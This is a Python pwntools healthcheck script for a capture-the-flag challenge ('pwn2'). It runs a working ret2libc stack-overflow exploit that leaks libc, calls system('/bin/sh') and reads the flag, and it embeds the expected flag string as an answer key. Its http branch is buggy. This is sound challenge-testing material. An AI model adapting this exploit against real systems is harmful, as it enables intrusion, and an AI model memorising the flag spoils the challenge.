#!/usr/bin/env python3
from pwn import *
import argparse

def solve(host, port=9002):
	context.log_level = 'error' # silent
	elf = ELF("dist/pwn2")
	libc = ELF("dist/libc.so.6")

	flag = 'flag{R3t-t0-th3-b4nk}'
	try:
	  p = remote(host, port, timeout=10)

	  # pwn cyclic -l 0x61616176
	  offset = 84

	  # read address of atoi in memory
	  p.recvuntil(b"address: ")
	  address_of_atoi = int(p.recvline().decode("utf-8").strip(), 16) # convert from hex characters to a number

	  # now that we know address of atoi in memory, we can use it to calculate the base address of libc in memory (since we know the offset to the atoi function within the provided libc)
	  libc.address = address_of_atoi - libc.symbols["atoi"]

	  # get address of system and a "/bin/sh" string from libc
	  system_address = libc.symbols["system"]
	  binsh_address = next(libc.search(b"/bin/sh\x00"))

	  # create a fake stack frame, overwriting the saved EIP with the address of system, and putting the "/bin/sh" string into the position of the first argument
	  payload = b"A" * offset + p32(system_address) + b"B" * 4 + p32(binsh_address)

	  p.sendline(payload)
	  p.sendline(b"cat flag")
	  p.recvline() # There are X digits in XYZ
	  r = p.recvline().decode("utf-8").strip()
	except:
		return False

	if r != flag:
		return False
	else:
		return True

if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Healthcheck')
	parser.add_argument('--connection-info', help='Either in the format `nc <host> <port>` or `http[s]://host[:port]`', required=True)
	args = parser.parse_args()
	conn = args.connection_info
	if conn[:3] == "nc ":
		_, host, port = conn.split(' ')
	elif conn[:5] == "http":
		target = conn
	ok = solve(host, port)
	if ok:
		print("pwn2 is good")
		exit(0)
	else:
		print("pwn2 is bad")
		exit(1)